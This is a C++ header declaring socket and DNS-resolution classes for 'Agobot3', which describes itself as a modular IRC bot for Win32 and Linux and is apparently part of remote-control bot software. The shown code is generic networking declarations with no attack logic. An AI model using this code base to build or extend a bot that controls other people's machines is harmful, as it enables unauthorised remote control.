/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef __SOCKETS_H__
#define __SOCKETS_H__

#include "cstring.h"

extern bool volatile g_bSocketsRunning;

class CSocket
{
public:
					 CSocket(bool bPerm=false);
	virtual			~CSocket();

	bool			 Connect(const char *szHost, int iPort, bool bAsync=false, bool bUseSSL=false);
	bool			 Connect(const unsigned long lHost, int iPort, bool bAsync=false, bool bUseSSL=false);
	void			 Disconnect();
	void			 ClearSocket();
	bool			 Bind(int iPort);
	bool			 Accept(CSocket &sSocket, sockaddr_in *cssin=NULL, bool bUseSSL=false);

	bool			 Recv(char *szBuffer, int iBufSize, int *pBytesRead=NULL);
	bool			 RecvTO(char *szBuffer, int iBufSize, unsigned long lTimeOut, int *pBytesRead=NULL);
	bool			 Write(const char *szBuffer, int iBufSize, int *pBytesWritten=NULL);

	bool			 RecvLine(char *szBuffer, int iBufSize);
	bool			 RecvLineIRC(char *szBuffer, int iBufSize);

	int				 GetSockName(sockaddr *pSockAddr, int *pSockAddrLen);
	int				 GetPeerName(sockaddr *pSockAddr, int *pSockAddrLen);

	bool			 IsConnected();
	bool			 GotError();

	int				 GetSocket() { return m_sSocket; }

	void			 CloneToTemp(CSocket &sSocket);

	void			 SetAsync(bool bAsync=true);

	void			 operator=(const CSocket &sSock) {
		m_sSocket=sSock.m_sSocket; m_bConnected=sSock.m_bConnected;
#ifndef AGOBOT_NO_OPENSSL
		m_pSSL=sSock.m_pSSL; m_psslCtx=sSock.m_psslCtx;
#endif // AGOBOT_NO_OPENSSL
	}

	void			 operator=(const int &sSock) { m_sSocket=sSock; m_bConnected=(sSock!=SOCKET_ERROR); }

	unsigned short	 m_sPort;
	char			 m_szHost[2048];

protected:
	int				 m_sSocket;
	bool			 m_bPerm;
	bool			 m_bConnected;
	bool			 m_bAsync;
	bool			 m_bUseSSL;
#ifndef AGOBOT_NO_OPENSSL
	SSL_CTX			*m_psslCtx;
	SSL				*m_pSSL;
#endif // AGOBOT_NO_OPENSSL
};

class CDNS
{
public:
					 CDNS();
	virtual			~CDNS();

	unsigned long	 ResolveAddress(const char *szHost);
	CString			 ResolveMX(const char *szHost);
private:
	CSocket			 m_sSocket;								// This is only so WinSock is initialized
};

#endif // __SOCKETS_H__
